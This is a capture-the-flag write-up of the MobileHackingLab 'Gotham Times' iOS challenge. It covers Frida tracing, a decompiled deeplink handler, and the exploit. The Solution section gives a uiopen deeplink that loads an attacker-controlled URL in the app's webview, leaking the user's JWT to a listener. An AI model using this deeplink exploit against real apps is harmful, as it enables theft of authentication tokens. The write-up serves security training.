Title: MobileHackingLab - Gotham Times
Slug: mobile/mobilehackinglab/gotham-times
Date: 2025-10-04 18:00
Category: Mobile

This is an iOS mobile challenge from [MobileHackingLabs](https://www.mobilehackinglab.com/course/lab-gotham-times).

The challenge is built around the fictional newspaper Gotham Times, an iOS application providing users with the latest news and updates about events happening in Gotham City.

**Objective**: Craft a deeplink exploit to steal an authentication token.

The app presents itself as follows:

![[gotham-times-app-1.jpg]]

![[gotham-times-app-2.jpg]]

When focusing on any text field, on a real iPhone device (no Corelium emulator), the keyboard remains opened and it's not possible to close it even by tapping outside the field:

![[gotham-times-app-3.jpg]]

This didn't allowed me to complete the signup process. To bypass this inconvenience, I've programmatically forced closing the keyboard with the following `frida` script:

~~~javascript
function closeKeyboard(f=null){
    // Collect all Gotham Times' Controllers
    let controllers = Object.keys(ObjC.classes).filter(x => x.includes('Gotham') && x.includes('Controller'));   
    if(f != null){
        controllers = controllers.filter(x=>x.includes(f))
    }
    controllers.forEach((c, _) => {
        // Get the active instance for that controller, whether it exists
        ObjC.choose(ObjC.classes[c],{
        	onMatch: (instance) => {
                // use '- endEditing:' for closing the keyboard on the active controller's view
                ObjC.schedule(ObjC.mainQueue, function () {
        			instance.view()['- endEditing:']();
        		})
        	}, 
        	onComplete: () => {
        		// Do nothing
        	}
        })
    })
}
~~~

![[gotham-times-frida-1.png]]

The script has been executed as follows:

![[gotham-times-frida-2.png]]

The keyboard is closed and it's possible to complete the signup process:

![[gotham-times-app-4.jpg]]

After creating an account and logging in, the app presents a list of news as shown below:


![[gotham-times-app-5.jpg]]

## Static Analysis

Since the goal of the challenge is to exploit a deeplink, the first step has been to analyze which URL schema the applications allows by analysing the application's `Info.plist`:

~~~shell
plutil -p Payload/Gotham\ Times.app/Info.plist
~~~

![[gotham-times-static-1.png]]

The URL schema `gothamtimes` is therefore identified.

## Dynamic Analysis

In order to understand which class handles the deeplink, I've setup `frida-trace` as follows, tracing all methods for all classing starting with "Gotham":

~~~
frida-trace -U -m "*[Gotham* *]" -n 'Gotham Times' 
~~~

![[gotham-times-dynamic-1.png]]

Then, after connecting with SSH to the device, I've ran the following command to trigger the deeplink:

~~~
uiopen gothamtimes://test
~~~

As shown below, the class `Gotham_Times::SceneDelegate` handles the deeplink with the method `scene`:

![[gotham-times-dynamic-2.png]]

Following the decompiled code from `ghidra` of the `Gotham_Times::SceneDelegate::scene` method:

~~~c
/* Gotham_Times.SceneDelegate.scene(_: __C.UIScene, openURLContexts:
   Swift.Set<__C.UIOpenURLContext>) -> () */

void __thiscall
Gotham_Times::SceneDelegate::scene(SceneDelegate *this,UIScene *param_1,Set<> openURLContexts)

{
  long lVar1;
  String SVar2;
  SceneDelegate *pSVar3;
  StaticString SVar4;
  code *pcVar5;
  bool bVar6;
  UIScene *pUVar7;
  undefined *puVar8;
  Iterator IVar9;
  URL UVar10;
  char *pcVar11;
  URL UVar12;
  UIStoryboard *pUVar13;
  UINavigationController *this_00;
  UIWindow *pUVar14;
  NewsController *pNVar15;
  UIViewController *pUVar16;
  Set SVar17;
  long lVar18;
  void *pvVar19;
  char *pcVar20;
  char *in_x3;
  char *pcVar21;
  void *in_x5;
  long extraout_x8;
  long extraout_x8_00;
  long extraout_x8_01;
  tuple2.conflict1 tVar22;
  String SVar23;
  String SVar24;
  String check_str;
  String SVar25;
  String separator;
  String separator_00;
  String separator_01;
  String SVar26;
  undefined1 auStack_3b0 [8];
  undefined8 uStack_3a8;
  undefined4 auStack_3a0 [4];
  UIViewController *local_390;
  UIViewController *local_388;
  UIViewController *local_380;
  UIViewController *local_378;
  UIWindow **local_370;
  UIWindow *local_368;
  UIWindow **local_360;
  UIWindow *local_358;
  undefined4 local_34c;
  void *local_348;
  UIStoryboard *local_340;
  NSString *local_338;
  UIStoryboard *local_330;
  UIStoryboard *local_328;
  undefined8 local_320;
  UINavigationController *local_318;
  uint local_30c;
  char *local_308;
  char *local_300;
  void *local_2f8;
  undefined *local_2f0;
  char *local_2e8;
  void *local_2e0;
  uint local_2d4;
  char *local_2d0;
  char *local_2c8;
  char *local_2c0;
  void *local_2b8;
  undefined **local_2b0;
  uint local_2a8;
  uint local_2a4;
  void *local_2a0;
  char *local_298;
  char *local_290;
  char *local_288;
  char *local_280;
  char *local_278;
  char *local_270;
  protocol_t *local_268;
  undefined *local_260;
  undefined *local_258;
  code *local_250;
  code *local_248;
  char *local_240;
  undefined *local_238;
  long local_230;
  char *local_228;
  undefined *local_220;
  undefined *local_218;
  UIScene *local_210;
  UIOpenURLContext *local_208;
  undefined1 *local_200;
  UIScene *local_1f8;
  UIScene *local_1f0;
  UIScene *local_1e8;
  UIScene *local_1e0;
  SceneDelegate *local_1d8;
  undefined *local_1d0;
  ulong *local_1c8;
  StaticString local_1c0;
  char *local_1b8;
  char *local_1b0;
  Set local_1a8;
  char *local_1a0;
  long local_198;
  ulong local_190;
  undefined *local_188;
  ulong local_180;
  undefined *local_178;
  ulong local_170;
  long local_168;
  ulong local_160;
  long local_158;
  UIScene *inputUrl;
  UIScene *local_148;
  char *local_140;
  void *local_138;
  UIViewController *local_130;
  UIWindow *local_128;
  UIWindow *local_120;
  UINavigationController *local_118;
  UIStoryboard *local_110;
  UIStoryboard *local_108;
  undefined1 auStack_100 [8];
  long local_f8;
  char *local_f0;
  void *local_e8;
  char *local_e0;
  void *local_d8;
  undefined *local_d0;
  long local_c8;
  char *local_c0;
  char *local_b8;
  undefined *local_b0;
  undefined *local_a8;
  undefined1 auStack_a0 [40];
  UIScene *local_78;
  SceneDelegate *local_70;
  undefined *local_68;
  UIScene *local_60;
  undefined1 auStack_58 [40];
  undefined7 extraout_var;
  
  local_1d0 = PTR_$$type_metadata_for_Any_100028708 + 8;
  local_1c8 = (ulong *)PTR__swift_isaMask_100028640;
  local_1c0.unknown = "Fatal error";
  local_1b8 = "Unexpectedly found nil while unwrapping an Optional value";
  local_1b0 = "Gotham_Times/SceneDelegate.swift";
  local_60 = (UIScene *)0x0;
  local_68 = (undefined *)0x0;
  local_70 = (SceneDelegate *)0x0;
  local_78 = (UIScene *)0x0;
  local_1d8 = this;
  local_1a8.unknown = openURLContexts.unknown;
  inputUrl = param_1;
  _memset(auStack_a0,0,0x28);
  local_b0 = (undefined *)0x0;
  local_e0 = (char *)0x0;
  local_d8 = (void *)0x0;
  local_108 = (UIStoryboard *)0x0;
  local_110 = (UIStoryboard *)0x0;
  local_118 = (UINavigationController *)0x0;
  local_130 = (UIViewController *)0x0;
  local_1a0 = (char *)Foundation::URL::typeMetadataAccessor();
  local_198 = *(long *)(local_1a0 + -8);
  local_190 = *(long *)(local_198 + 0x40) + 0xfU & 0xfffffffffffffff0;
  pUVar7 = inputUrl;
  SVar17.unknown = local_1a8.unknown;
  (*(code *)PTR____chkstk_darwin_1000281f0)();
  puVar8 = (undefined *)((long)&local_390 - local_190);
  local_180 = extraout_x8 + 0xfU & 0xfffffffffffffff0;
  local_188 = puVar8;
  (*(code *)PTR____chkstk_darwin_1000281f0)();
  puVar8 = puVar8 + -local_180;
  local_170 = extraout_x8_00 + 0xfU & 0xfffffffffffffff0;
  local_178 = puVar8;
  (*(code *)PTR____chkstk_darwin_1000281f0)();
  lVar1 = (long)puVar8 - local_170;
  local_160 = extraout_x8_01 + 0xfU & 0xfffffffffffffff0;
  local_168 = lVar1;
  (*(code *)PTR____chkstk_darwin_1000281f0)();
  lVar1 = lVar1 - local_160;
  local_158 = lVar1;
  local_70 = this;
  local_68 = SVar17.unknown;
  local_60 = pUVar7;
  _objc_retain();
  puVar8 = &_OBJC_CLASS_$_UIWindowScene;
  _objc_opt_self(&_OBJC_CLASS_$_UIWindowScene);
  pUVar7 = inputUrl;
  _swift_dynamicCastObjCClass(inputUrl,puVar8);
  local_1e0 = pUVar7;
  local_148 = pUVar7;
  if (pUVar7 == (UIScene *)0x0) {
    local_1e8 = (UIScene *)0x0;
    _objc_release(inputUrl);
    local_1e0 = local_1e8;
  }
  local_1f0 = local_1e0;
  if (local_1e0 != (UIScene *)0x0) {
    local_1f8 = local_1e0;
    local_210 = local_1e0;
    local_78 = local_1e0;
    _swift_bridgeObjectRetain(local_1a8.unknown);
    local_208 = __C::UIOpenURLContext::typeMetadataAccessor();
    __C::UIOpenURLContext::$lazy_protocol_witness_table_accessor();
    local_200 = auStack_58;
    Swift::Set::$makeIterator(local_1a8);
    _memcpy(auStack_a0,local_200,0x28);
    while( true ) {
      IVar9.unknown =
           &
           $$demangling_cache_variable_for_type_metadata_for_Swift.Set<__C.UIOpenURLContext>.Iterato r
      ;
      ___swift_instantiateConcreteTypeFromMangledName();
      Swift::Set::Iterator::$next(IVar9);
      UVar12.unknown = local_178;
      local_218 = local_a8;
      if (local_a8 == (undefined *)0x0) break;
      local_220 = local_a8;
      local_260 = local_a8;
      local_b0 = local_a8;
      tVar22 = Swift::$_allocateUninitializedArray(1);
      local_2a0 = tVar22.1;
      local_298 = tVar22._0_8_;
      local_268 = &objc::protocol_t::WKUIDelegate;
      UVar10.unknown = local_260;
      _objc_msgSend(local_260,"URL");
      _objc_retainAutoreleasedReturnValue();
      local_290 = UVar10.unknown;
      Foundation::URL::$_unconditionallyBridgeFromObjectiveC(UVar10);
      *(char **)((long)local_2a0 + 0x18) = local_1a0;
      ___swift_allocate_boxed_opaque_existential_0();
      pcVar20 = local_1a0;
      (**(code **)(local_198 + 0x20))();
      pcVar11 = local_298;
      Swift::$_finalizeUninitializedArray(local_298,local_1d0);
      pcVar21 = local_290;
      local_270 = pcVar11;
      _objc_release();
      check_str.bridgeObject = pcVar11;
      check_str.str = pcVar21;
      separator.bridgeObject = in_x3;
      separator.str = pcVar20;
      Swift::$print(check_str,separator);
      SVar23.bridgeObject = pcVar11;
      SVar23.str = pcVar21;
      separator_00.bridgeObject = in_x3;
      separator_00.str = pcVar20;
      local_288 = pcVar21;
      local_278 = pcVar11;
      Swift::$print(SVar23,separator_00);
      SVar24.bridgeObject = local_288;
      SVar24.str = local_270;
      separator_01.bridgeObject = pcVar21;
      separator_01.str = local_278;
      local_280 = pcVar11;
      Swift::$print(SVar24,separator_01);
      _swift_bridgeObjectRelease(local_280);
      _swift_bridgeObjectRelease(local_278);
      _swift_bridgeObjectRelease(local_270);
      UVar10.unknown = local_260;
      _objc_msgSend(local_260,local_268[0x2e].instanceProperties);
      _objc_retainAutoreleasedReturnValue();
      local_258 = UVar10.unknown;
      Foundation::URL::$_unconditionallyBridgeFromObjectiveC(UVar10);
      local_250 = *(code **)(local_198 + 0x10);
      lVar18 = local_168;
      (*local_250)(UVar12.unknown,local_168,local_1a0);
      Foundation::URL::$get_host(UVar12);
      local_248 = *(code **)(local_198 + 8);
      local_238 = UVar12.unknown;
      local_230 = lVar18;
      (*local_248)(local_178,local_1a0);
      (*local_248)(local_168,local_1a0);
      _swift_bridgeObjectRetain(local_230);
      check_str = Swift::String::init("open",4,1);
      local_228 = (char *)check_str.bridgeObject;
      local_240 = check_str.str;
      _swift_bridgeObjectRetain();
      local_d0 = local_238;
      local_c8 = local_230;
      local_c0 = local_240;
      local_b8 = local_228;
      if (local_230 == 0) {
        if (local_228 != (char *)0x0) goto LAB_1000195a4;
        $$outlined_destroy_of_Swift.String?(&local_d0);
        local_2a4 = 1;
      }
      else {
        $$outlined_init_with_copy_of_Swift.String?(&local_d0,&local_140);
        if (local_b8 == (char *)0x0) {
          $$outlined_destroy_of_Swift.String(&local_140);
LAB_1000195a4:
          $$outlined_destroy_of_(Swift.String?,Swift.String?)(&local_d0);
          local_2a4 = 0;
        }
        else {
          local_2d0 = local_140;
          local_2b8 = local_138;
          _swift_bridgeObjectRetain();
          local_2c8 = local_c0;
          local_2b0 = &local_d0;
          local_2c0 = local_b8;
          _swift_bridgeObjectRetain();
          SVar2.bridgeObject = local_2c0;
          SVar2.str = local_2c8;
          SVar25.bridgeObject = local_2b8;
          SVar25.str = local_2d0;
          SVar26.bridgeObject = in_x5;
          SVar26.str = pcVar11;
          pcVar21 = local_2c0;
          bVar6 = Swift::String::==_infix(SVar25,SVar2,SVar26);
          local_2a8 = (uint)CONCAT71(extraout_var,bVar6);
          _swift_bridgeObjectRelease(local_2c0);
          _swift_bridgeObjectRelease(local_2b8);
          _swift_bridgeObjectRelease(local_2c0);
          _swift_bridgeObjectRelease(local_2b8);
          $$outlined_destroy_of_Swift.String?(local_2b0);
          local_2a4 = local_2a8;
        }
      }
      local_2d4 = local_2a4;
      _swift_bridgeObjectRelease(local_228);
      _swift_bridgeObjectRelease(local_230);
      _objc_release(local_258);
      UVar12.unknown = local_188;
      if ((local_2d4 & 1) != 0) {
        UVar10.unknown = local_260;
        _objc_msgSend(local_260,"URL");
        _objc_retainAutoreleasedReturnValue();
        local_2f0 = UVar10.unknown;
        Foundation::URL::$_unconditionallyBridgeFromObjectiveC(UVar10);
        (*local_250)(UVar12.unknown,local_158,local_1a0);
        check_str = Foundation::URL::get_absoluteString(UVar12);
        pSVar3 = local_1d8;
        local_2f8 = check_str.bridgeObject;
        local_308 = check_str.str;
        (*local_248)(local_188,local_1a0);
        (*local_248)(local_158,local_1a0);
        check_str = Swift::String::init("url",3,1);
        pcVar21 = (char *)check_str.bridgeObject;
        pcVar11 = local_308;
        pvVar19 = local_2f8;
        local_300 = pcVar21;
        (**(code **)((*(ulong *)pSVar3 & *local_1c8) + 0x78))(local_308,local_2f8,check_str.str);
        local_2e8 = pcVar11;
        local_2e0 = pvVar19;
        _swift_bridgeObjectRelease(local_300);
        _swift_bridgeObjectRelease(local_2f8);
        _objc_release(local_2f0);
        local_e0 = local_2e8;
        local_d8 = local_2e0;
        local_f0 = local_2e8;
        local_e8 = local_2e0;
        $$outlined_init_with_copy_of_Swift.String?(&local_f0,auStack_100);
        bVar6 = local_f8 != 0;
        if (bVar6) {
          $$outlined_destroy_of_Swift.String?(auStack_100);
        }
        local_30c = (uint)bVar6;
        if (local_30c != 0) {
          local_320 = 0;
          pUVar13 = __C::UIStoryboard::typeMetadataAccessor();
          local_34c = 1;
          check_str = Swift::String::init("Main",4,1);
          local_340 = __C::UIStoryboard::$__allocating_init(pUVar13,check_str);
          local_108 = local_340;
          check_str = Swift::String::init("TabbedControllerID",0x12,(byte)local_34c & 1);
          local_348 = check_str.bridgeObject;
          local_338 = (extension_Foundation)::Swift::String::_bridgeToObjectiveC();
          _swift_bridgeObjectRelease(local_348);
          pUVar13 = local_340;
          _objc_msgSend(local_340,"instantiateViewControllerWithIdentifier:",local_338);
          _objc_retainAutoreleasedReturnValue();
          local_330 = pUVar13;
          _objc_release(local_338);
          puVar8 = &_OBJC_CLASS_$_UITabBarController;
          _objc_opt_self(&_OBJC_CLASS_$_UITabBarController);
          pUVar13 = local_330;
          _swift_dynamicCastObjCClassUnconditional(local_330,puVar8,0,0);
          local_328 = pUVar13;
          local_110 = pUVar13;
          _objc_msgSend();
          this_00 = __C::UINavigationController::typeMetadataAccessor();
          _objc_retain(local_328);
          local_318 = __C::UINavigationController::__allocating_init
                                (this_00,(UIViewController *)local_328);
          local_118 = local_318;
          pUVar14 = __C::UIWindow::typeMetadataAccessor();
          _objc_retain(local_210);
          pUVar14 = __C::UIWindow::__allocating_init(pUVar14,(UIWindowScene *)local_210);
          (**(code **)((*(ulong *)local_1d8 & *local_1c8) + 0x60))();
          (**(code **)((*(ulong *)local_1d8 & *local_1c8) + 0x58))();
          local_120 = pUVar14;
          if (pUVar14 == (UIWindow *)0x0) {
            pUVar14 = (UIWindow *)&local_120;
            $$outlined_destroy_of___C.UIWindow?();
          }
          else {
            local_360 = &local_120;
            local_358 = pUVar14;
            _objc_retain();
            $$outlined_destroy_of___C.UIWindow?(local_360);
            _objc_retain(local_318);
            _objc_msgSend(local_358,"setRootViewController:",local_318);
            _objc_release(local_318);
            pUVar14 = local_358;
            _objc_release();
          }
          (**(code **)((*(ulong *)local_1d8 & *local_1c8) + 0x58))();
          local_128 = pUVar14;
          if (pUVar14 == (UIWindow *)0x0) {
            $$outlined_destroy_of___C.UIWindow?(&local_128);
          }
          else {
            local_370 = &local_128;
            local_368 = pUVar14;
            _objc_retain();
            $$outlined_destroy_of___C.UIWindow?(local_370);
            _objc_msgSend(local_368,"makeKeyAndVisible");
            _objc_release(local_368);
          }
          pUVar13 = local_328;
          _objc_msgSend(local_328,"selectedViewController");
          _objc_retainAutoreleasedReturnValue();
          pcVar11 = local_1b8;
          SVar4.unknown = local_1c0.unknown;
          local_378 = (UIViewController *)pUVar13;
          if (pUVar13 == (UIStoryboard *)0x0) {
            *(undefined1 *)(lVar1 + -0x20) = 2;
            *(undefined8 *)(lVar1 + -0x18) = 0x2b;
            *(undefined4 *)(lVar1 + -0x10) = 0;
            Swift::_assertionFailure
                      (SVar4,(StaticString)0xb,(StaticString)0x2,(__uint64)pcVar11,0x39);
                    /* WARNING: Does not return */
            pcVar5 = (code *)SoftwareBreakpoint(1,0x1000199cc);
            (*pcVar5)();
          }
          local_390 = (UIViewController *)pUVar13;
          local_380 = (UIViewController *)pUVar13;
          pNVar15 = NewsController::typeMetadataAccessor();
          pcVar21 = (char *)0x0;
          pUVar16 = local_390;
          _swift_dynamicCastClassUnconditional(local_390,pNVar15,0);
          local_388 = pUVar16;
          local_130 = pUVar16;
          _swift_bridgeObjectRetain(local_2e0);
          (**(code **)((*(ulong *)pUVar16 & *local_1c8) + 0x88))(local_2e8,local_2e0);
          (**(code **)((*(ulong *)local_388 & *local_1c8) + 0xa0))();
          _objc_release(local_388);
          _objc_release(local_318);
          _objc_release(local_328);
          _objc_release(local_340);
        }
        _swift_bridgeObjectRelease(local_2e0);
      }
      _objc_release(local_260);
      in_x3 = pcVar21;
    }
    $$outlined_destroy_of_Swift.Set<>.Iterator(auStack_a0);
    _objc_release(local_210);
  }
  return;
}
~~~

This method perform the following operations:

- **URL Processing**: When the app receives a URL to open like `gothamtimes://something`, this method gets called.
- **Checks for URLs with the host "open"** like `gothamtimes://open/...`
- **Extracts URL Parameter**: If the host matches "open", it calls `getQueryStringParameter` to extract a URL parameter named "url", like `gothamtimes://open?url=http://shomething`
- **Open the URL** in a `WKWebView` .

Therefore, based on the decompiled code, the deeplink format that the application is expecting is the following: `gothamtimes://open?url=<target url>`.

## Solution

The following deeplink is executed; the `url` parameter points to an attacker-controlled server on which has been preemptively setup a listener on port `8000`.

~~~shell
uiopen 'gothamtimes://open?url=http://192.168.1.182:8000'
~~~

![[gotham-times-solution-1.png]]

![[gotham-times-app-6.jpg]]

The application processes the deeplinks and opens a webview to the provided URL; on the attacker listener, the following headers are received, leaking the JWT token in the `Authorization` header  and the flag:

![[gotham-times-solution-2.png]]

## Extended Analysis

By looking  to the `Info.plist`'s `UIApplicationSceneManifest` property, it's possible to statically identify the deeplink handler without need of `frida-trace`:

![[gotham-times-static-2.png]]
